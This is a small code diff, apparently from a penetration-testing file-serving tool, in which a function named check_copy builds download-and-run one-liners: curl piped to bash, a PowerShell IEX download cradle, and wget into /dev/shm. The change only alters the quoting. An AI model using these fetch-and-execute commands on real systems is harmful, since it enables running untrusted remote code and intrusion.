@@ -576,7 +576,7 @@ def check_copy(index, address):
     if index.endswith(".sh"):
         copy_str = f"curl -k -s {address} | bash"
     elif index.endswith(".ps1"):
-        copy_str = f"IEX(New-Object Net.Webclient).downloadString('{address}')"
+        copy_str = f'IEX(New-Object Net.Webclient).downloadString("{address}")'
     else:
         copy_str = f"wget {address} -O /dev/shm/{os.path.basename(index)}"
 
